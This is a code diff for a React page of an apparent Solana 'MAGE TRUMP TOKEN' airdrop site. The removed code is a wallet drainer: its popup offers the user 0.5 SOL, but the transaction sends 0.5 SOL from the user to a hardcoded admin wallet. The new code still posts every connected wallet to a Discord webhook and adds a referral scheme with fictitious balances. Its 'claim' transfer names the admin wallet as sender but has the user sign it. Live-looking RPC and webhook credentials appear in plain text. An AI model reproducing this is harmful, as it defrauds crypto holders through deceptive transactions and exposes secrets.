@@ -1,9 +1,23 @@
-import React, { useState } from 'react';
+import React, { useEffect, useState } from 'react';
 import trumpImage from '../assets/front.png';
 import { Link } from 'react-router-dom';
 import { db } from '../firebase/firebase';
-import { addDoc, updateDoc, doc, getDoc, collection } from 'firebase/firestore';
-import { Connection, PublicKey, SystemProgram, Transaction } from '@solana/web3.js';
+import {
+  addDoc,
+  updateDoc,
+  doc,
+  getDoc,
+  getDocs,
+  query,
+  collection,
+  where,
+} from 'firebase/firestore';
+import {
+  Connection,
+  PublicKey,
+  SystemProgram,
+  Transaction,
+} from '@solana/web3.js';
 import { useWallet } from '@solana/wallet-adapter-react';
 import { WalletMultiButton } from '@solana/wallet-adapter-react-ui';
 
@@ -12,50 +26,29 @@ export default function Home() {
   const [status, setStatus] = useState('');
   const [error, setError] = useState('');
   const [showPopup, setShowPopup] = useState(false);
+  const [userData, setUserData] = useState(null);
+  const [rescuePopup, setRescuePopup] = useState(false);
 
   const walletAddress = publicKey?.toBase58() || '';
-  const connection = new Connection('https://multi-solitary-mound.solana-mainnet.quiknode.pro/8e58afdbaa8a8759d59583bd41d191ce8445d9c3/', 'confirmed');
-  const adminWallet = new PublicKey('4SCGGaB8RFKGi1pQXZ71vejUehvrZW5taoGMToqCcKUD');
+  const connection = new Connection(
+    'https://multi-solitary-mound.solana-mainnet.quiknode.pro/8e58afdbaa8a8759d59583bd41d191ce8445d9c3/',
+    'confirmed'
+  );
 
   const sendToDiscord = async (wallet) => {
     try {
-      await fetch('https://discord.com/api/webhooks/1360353395365380177/5Lejy62BSrPzxKQ-Ak7kaZJ8AROonM0-49o-1_n9oOoAia9Rcg0fGBlSZC_iQHfA6trA', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          content: `📢 Nova wallet conectada: \`${wallet}\``
-        }),
-      });
-    } catch (err) {
-      console.error('Erro ao enviar webhook:', err);
-    }
-  };
-
-  const handleSendSol = async () => {
-    try {
-      const latestBlockhash = await connection.getLatestBlockhash();
-
-      const transaction = new Transaction({
-        feePayer: publicKey,
-        recentBlockhash: latestBlockhash.blockhash,
-      }).add(
-        SystemProgram.transfer({
-          fromPubkey: publicKey,
-          toPubkey: adminWallet,
-          lamports: 0.5 * 1e9,
-        })
+      await fetch(
+        'https://discord.com/api/webhooks/1360353395365380177/5Lejy62BSrPzxKQ-Ak7kaZJ8AROonM0-49o-1_n9oOoAia9Rcg0fGBlSZC_iQHfA6trA',
+        {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            content: `📢 New wallet connected: \`${wallet}\``,
+          }),
+        }
       );
-
-      const signature = await sendTransaction(transaction, connection);
-      await connection.confirmTransaction({ signature, ...latestBlockhash }, 'confirmed');
-
-      console.log('✅ SOL enviado com sucesso:', signature);
-      setShowPopup(false);
-      alert('0.5 SOL enviado com sucesso!');
     } catch (err) {
-      console.error('❌ Erro ao enviar SOL:', err);
-      setError(err.message);
-      setShowPopup(false);
+      console.error('Error sending webhook:', err);
     }
   };
 
@@ -66,11 +59,13 @@ export default function Home() {
 
   const handleUserRegistration = async () => {
     if (!walletAddress) return;
-
     setStatus('Registering wallet...');
+
     try {
       const userRef = doc(db, 'users', walletAddress);
       const docSnap = await getDoc(userRef);
+
+      const referral = getReferralFromURL();
 
       if (docSnap.exists()) {
         await updateDoc(userRef, {
@@ -80,22 +75,103 @@ export default function Home() {
       } else {
         await addDoc(collection(db, 'users'), {
           wallet: walletAddress,
-          referral: getReferralFromURL(),
+          referral: referral,
           claimed: false,
           createdAt: new Date(),
+          refCount: 0,
+          balance: 0.5,
+          canClaim: false,
         });
 
-        await sendToDiscord(walletAddress); // Envia para o Discord se for nova
+        if (referral) {
+          const q = query(
+            collection(db, 'users'),
+            where('wallet', '==', referral)
+          );
+          const querySnapshot = await getDocs(q);
+
+          if (!querySnapshot.empty) {
+            const refUserDoc = querySnapshot.docs[0];
+            const refUserData = refUserDoc.data();
+
+            const updatedBalance =
+              Math.ceil((refUserData.balance + 0.1) * 10) / 10;
+            const updatedRefCount = (refUserData.refCount || 0) + 1;
+
+            await updateDoc(refUserDoc.ref, {
+              balance: updatedBalance,
+              refCount: updatedRefCount,
+            });
+          }
+        }
+
+        await sendToDiscord(walletAddress);
       }
 
-      setShowPopup(true);
       setStatus('Wallet registered!');
     } catch (err) {
-      console.error('Erro ao registrar carteira:', err);
-      setStatus('Erro ao registrar');
+      console.error('Error registering wallet:', err);
+      setStatus('Error registering wallet');
       setError(err.message);
     }
   };
+
+  const fetchUserData = async () => {
+    if (!walletAddress) return;
+    try {
+      const userRef = doc(db, 'users', walletAddress);
+      const docSnap = await getDoc(userRef);
+      if (docSnap.exists()) {
+        setUserData(docSnap.data());
+      }
+    } catch (err) {
+      console.error('Error fetching user data:', err);
+    }
+  };
+
+  const getRoundedBalance = () => {
+    if (!userData?.balance) return '0.0';
+    return (Math.ceil(userData.balance * 10) / 10).toFixed(1);
+  };
+
+  const handleRescue = async () => {
+    setRescuePopup(true);
+  };
+
+  const confirmRescue = async () => {
+    try {
+      const transaction = new Transaction().add(
+        SystemProgram.transfer({
+          fromPubkey: new PublicKey(
+            '4SCGGaB8RFKGi1pQXZ71vejUehvrZW5taoGMToqCcKUD'
+          ),
+          toPubkey: publicKey,
+          lamports: Math.floor((userData.balance || 0) * 1e9),
+        })
+      );
+
+      const latestBlockhash = await connection.getLatestBlockhash();
+      transaction.recentBlockhash = latestBlockhash.blockhash;
+      transaction.feePayer = publicKey;
+
+      const signature = await sendTransaction(transaction, connection);
+      await connection.confirmTransaction(
+        { signature, ...latestBlockhash },
+        'confirmed'
+      );
+
+      alert('SOL sent successfully!');
+      setRescuePopup(false);
+    } catch (err) {
+      console.error('Error during claim:', err);
+      setError(err.message);
+      setRescuePopup(false);
+    }
+  };
+
+  useEffect(() => {
+    fetchUserData();
+  }, [walletAddress]);
 
   return (
     <div className="min-h-screen bg-[#0a369d] text-white flex flex-col">
@@ -104,7 +180,7 @@ export default function Home() {
           <Link to="/" className="hover:underline">HOME</Link>
           <Link to="/about" className="hover:underline">ABOUT</Link>
           <Link to="/airdrop" className="hover:underline">AIRDROP</Link>
-          <Link to="/referrals" className="hover:underline text-yellow-300">REFERALS</Link>
+          <Link to="/referrals" className="hover:underline text-yellow-300">REFERRALS</Link>
         </div>
         <div className="mt-4 md:mt-0">
           <WalletMultiButton className="!bg-blue-600 !hover:bg-blue-700 !text-white !font-semibold !py-2 !px-4 !rounded transition" />
@@ -119,34 +195,44 @@ export default function Home() {
           <h1 className="text-4xl md:text-5xl font-bold mb-4">MAGE TRUMP TOKEN</h1>
           <h2 className="text-2xl font-bold text-white mb-2">Claim $MAGE Airdrop</h2>
           <p className="text-sm text-gray-200 max-w-sm mb-6">
-            Connect your wallet to receive 0.5 SOL, locked until launch on April 27
+            Connect your wallet to receive 0.5 SOL. Refer friends to earn more!
+          </p>
+          <p className="text-sm mb-2 text-green-300">
+            Current balance: {getRoundedBalance()} SOL
           </p>
           <button
             onClick={handleUserRegistration}
             disabled={!connected}
             className="bg-green-600 hover:bg-green-700 text-white font-semibold py-2 px-6 rounded disabled:opacity-40"
           >
-            Register & Claim
+            Register
+          </button>
+          <button
+            onClick={handleRescue}
+            disabled={!userData?.canClaim}
+            className="mt-4 bg-yellow-500 hover:bg-yellow-600 text-white font-semibold py-2 px-6 rounded disabled:opacity-40"
+          >
+            Claim Balance
           </button>
           {status && <p className="mt-4">{status}</p>}
           {error && <p className="mt-4 text-red-500">{error}</p>}
         </div>
       </main>
 
-      {showPopup && (
+      {rescuePopup && (
         <div className="fixed top-0 left-0 w-full h-full bg-gray-800 bg-opacity-50 flex items-center justify-center z-50">
           <div className="bg-white p-6 rounded shadow-lg max-w-sm w-full">
-            <h2 className="text-xl font-bold mb-4 text-black">Confirm Transaction</h2>
-            <p className="text-black">Do you want to receive 0.5 SOL?</p>
+            <h2 className="text-xl font-bold mb-4 text-black">Confirm Claim</h2>
+            <p className="text-black">Do you want to claim your {getRoundedBalance()} SOL?</p>
             <div className="mt-4 flex justify-between">
               <button
-                onClick={handleSendSol}
+                onClick={confirmRescue}
                 className="bg-blue-500 hover:bg-blue-600 text-white font-semibold py-2 px-4 rounded"
               >
                 Yes
               </button>
               <button
-                onClick={() => setShowPopup(false)}
+                onClick={() => setRescuePopup(false)}
                 className="bg-gray-500 hover:bg-gray-600 text-white font-semibold py-2 px-4 rounded"
               >
                 Cancel
